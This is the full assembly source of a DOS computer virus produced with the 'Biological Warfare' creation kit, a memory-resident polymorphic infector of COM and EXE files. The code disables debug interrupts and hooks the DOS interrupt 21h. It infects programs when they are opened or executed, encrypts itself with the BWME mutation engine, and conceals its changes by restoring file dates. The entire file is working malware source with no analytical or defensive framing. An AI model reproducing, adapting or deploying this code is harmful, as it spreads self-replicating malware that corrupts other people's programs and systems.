; test1.asm : Test virus #1
; Created with Biological Warfare - Version 0.90 by MnemoniX
; a resident polymorphic COM/EXE infector (using BWME)

PING            equ     0F43Fh
PONG            equ     0B1DEh
STAMP           equ     26
MARKER          equ     07070h

code            segment
                org     0
                assume  cs:code,ds:code

start:
                db      0E9h,3,0          ; to virus
host:
                db      0CDh,20h,0        ; host program
virus_begin:
                push    ds es

                call    $ + 3             ; BP is instruction ptr.
                pop     bp
                sub     bp,offset $ - 1

                xor     ax,ax             ; mild anti-trace code
                mov     es,ax             ; kill interrupts 1 & 3
                mov     di,6
                stosw
                mov     di,14
                stosw

                in      al,21h            ; lock out & reopen keyboard
                xor     al,2
                out     21h,al
                xor     al,2
                out     21h,al

                mov     ax,PING           ; test for residency
                int     21h
                cmp     bx,PONG
                je      installed

                mov     ax,es                   ; Get PSP
                dec     ax
                mov     ds,ax                   ; Get MCB

                sub     word ptr ds:[3],((MEM_SIZE+1023) / 1024) * 64
                sub     word ptr ds:[12h],((MEM_SIZE+1023) / 1024) * 64
                mov     es,word ptr ds:[12h]

                push    cs                      ; copy virus into memory
                pop     ds
                xor     di,di
                mov     si,bp
                mov     cx,(virus_end - start) / 2 + 1
                rep     movsw

                xor     ax,ax                   ; capture interrupts
                mov     ds,ax

                mov     si,21h * 4              ; get original int 21
                mov     di,offset old_int_21
                movsw
                movsw

                mov     word ptr ds:[si - 4],offset new_int_21
                mov     ds:[si - 2],es          ; and set new int 21

installed:
                pop     es ds                   ; restore segregs
                cmp     sp,MARKER               ; check for .EXE
                je      exe_exit

com_exit:
                mov     si,[bp + mutator]       ; restore host program
                sub     si,3
                mov     di,100h
                push    di
                movsw
                movsb

                call    fix_regs                ; fix up registers
                ret                             ; and leave
exe_exit:
                mov     ax,ds                   ; fix up return address
                add     ax,10h
                push    ax
                add     ax,cs:[bp + exe_cs]
                mov     cs:[bp + return_cs],ax

                mov     ax,cs:[bp + exe_ip]
                mov     cs:[bp + return_ip],ax

                pop     ax
                add     ax,cs:[bp + exe_ss]        ; restore stack
                cli
                mov     ss,ax
                mov     sp,cs:[bp + exe_sp]

                call    fix_regs                ; fix up registers
                sti

                db      0EAh                    ; back to host program
return_ip       dw      0
return_cs       dw      0

exe_cs          dw      -16                     ; orig CS:IP
exe_ip          dw      103h
exe_sp          dw      -2                      ; orig SS:SP
exe_ss          dw      -16

fix_regs:
                xor     ax,ax
                cwd
                xor     bx,bx
                mov     si,100h
                xor     di,di
                xor     bp,bp
                ret

; interrupt 21 handler
int_21:
                pushf
                call    dword ptr cs:[old_int_21]
                ret

new_int_21:
                cmp     ax,PING                 ; residency test
                je      ping_pong
                cmp     ah,3Dh                  ; file open
                je      file_open
                cmp     ax,4B00h                ; execute program
                je      execute
int_21_exit:
                db      0EAh                    ; never mind ...
old_int_21      dd      0

ping_pong:
                mov     bx,PONG
                iret

file_open:
                push    ax cx di es
                call    get_extension
                cmp     [di],'OC'               ; .COM file?
                jne     perhaps_exe             ; perhaps .EXE then
                cmp     byte ptr [di + 2],'M'
                jne     not_prog
                jmp     a_program
perhaps_exe:
                cmp     [di],'XE'               ; .EXE file?
                jne     not_prog
                cmp     byte ptr [di + 2],'E'
                jne     not_prog
a_program:
                pop     es di cx ax
                jmp     execute                 ; infect file
not_prog:
                pop     es di cx ax
                jmp     int_21_exit

execute:
                push    ax bx cx dx si di ds es

                xor     ax,ax                   ; critical error handler
                mov     es,ax                   ; routine - catch int 24
                mov     es:[24h * 4],offset int_24
                mov     es:[24h * 4 + 2],cs

                mov     ax,4300h                ; change attributes
                int     21h

                push    cx dx ds
                xor     cx,cx
                call    set_attributes

                mov     ax,3D02h                ; open file
                call    int_21
                jnc     open_it
                jmp     cant_open
open_it:
                xchg    bx,ax

                push    cs                      ; CS = DS
                pop     ds

                mov     ax,5700h                ; save file date/time
                int     21h
                push    cx dx
                and     cl,31                   ; check time stamp
                cmp     cl,STAMP
                jnz     its_ok
                jmp     dont_infect
its_ok:
                mov     ah,3Fh
                mov     cx,28
                mov     dx,offset read_buffer
                int     21h

                cmp     word ptr read_buffer,'ZM' ; .EXE?
                jne     its_ok_2
                jmp     infect_exe
its_ok_2:
                mov     al,2                    ; move to end of file
                call    move_file_ptr

                cmp     dx,65279 - (VIRUS_SIZE + 3)
                ja      dont_infect             ; too big, don't infect

                mov     word ptr new_jump + 1,dx

                add     dx,103h
                mov     mutator,dx
                push    cs                      ; call Biological Warfare
                pop     es                      ; Mutation Engine
                mov     cx,VIRUS_SIZE
                mov     di,offset encrypt_buffer
                mov     si,offset virus_begin

                call    _bwme

                push    cx
                mov     cx,3
                mov     ah,40h
                mov     dx,offset read_buffer   ; save original program head
                int     21h

                mov     ah,40h                  ; write virus to file
                pop     cx
                mov     dx,offset encrypt_buffer
                int     21h

                xor     al,al                   ; back to beginning of file
                call    move_file_ptr

                mov     dx,offset new_jump      ; and write new jump
                int     21h

fix_date_time:
                pop     dx cx
                and     cl,-32                  ; add time stamp
                or      cl,STAMP
                mov     ax,5701h                ; restore file date/time
                int     21h

close:
                pop     ds dx cx                ; restore attributes
                call    set_attributes

                mov     ah,3Eh                  ; close file
                int     21h

cant_open:
                pop     es ds di si dx cx bx ax
                jmp     int_21_exit             ; leave


set_attributes:
                mov     ax,4301h
                int     21h
                ret

dont_infect:
                pop     cx dx                   ; can't infect, skip
                jmp     close

move_file_ptr:
                mov     ah,42h                  ; move file pointer
                cwd
                xor     cx,cx
                int     21h

                mov     dx,ax                   ; set up registers
                mov     ah,40h
                mov     cx,3
                ret
infect_exe:
                cmp     word ptr read_buffer[26],0
                jne     dont_infect             ; overlay, don't infect

                cmp     word ptr read_buffer[16],MARKER
                je      dont_infect             ; infected already

                les     ax,dword ptr read_buffer[20]
                mov     exe_cs,es               ; CS
                mov     exe_ip,ax               ; IP

                les     ax,dword ptr read_buffer[14]
                mov     exe_ss,ax               ; SS
                mov     exe_sp,es               ; SP
                mov     word ptr read_buffer[16],MARKER

                mov     ax,4202h                ; to end of file
                cwd
                xor     cx,cx
                int     21h

                push    ax dx                   ; save file size

                push    bx
                mov     cl,12                   ; calculate offsets for CS
                shl     dx,cl                   ; and IP
                mov     bx,ax
                mov     cl,4
                shr     bx,cl
                add     dx,bx
                and     ax,15
                pop     bx

                sub     dx,word ptr read_buffer[8]
                mov     word ptr read_buffer[22],dx
                mov     word ptr read_buffer[20],ax
                add     dx,100
                mov     word ptr read_buffer[14],dx

                pop     dx ax                   ; calculate prog size

                add     ax,VIRUS_SIZE + 3
                adc     dx,0
                mov     cx,512                  ; in pages
                div     cx                      ; then save results
                inc     ax
                mov     word ptr read_buffer[2],dx
                mov     word ptr read_buffer[4],ax
                mov     dx,word ptr read_buffer[20]
                mov     cx,VIRUS_SIZE           ; call BWME
                mov     di,offset encrypt_buffer
                mov     si,offset virus_begin
                push    cs
                pop     es

                call    _bwme


                mov     ah,40h
                mov     dx,offset encrypt_buffer
                int     21h


                mov     ax,4200h                ; back to beginning
                cwd
                xor     cx,cx
                int     21h

                mov     ah,40h                  ; and fix up header
                mov     cx,28
                mov     dx,offset read_buffer
                int     21h
                jmp     fix_date_time           ; done

courtesy_of     db      '[BW]',0
signature       db      'Test virus #1',0

get_extension:
                push    ds                      ; find extension
                pop     es
                mov     di,dx
                mov     cx,64
                mov     al,'.'
                repnz   scasb
                ret
                include bwme.asm

int_24:
                mov     al,3                    ; int 24 handler
                iret
mutator         dw      106h
new_jump        db      0E9h,0,0

virus_end:
VIRUS_SIZE      equ     virus_end - virus_begin
read_buffer     db      28 dup (?)              ; read buffer
encrypt_buffer  db      VIRUS_SIZE dup (?)      ; encryption buffer

end_heap:

MEM_SIZE        equ     end_heap - start

code            ends
                end     start
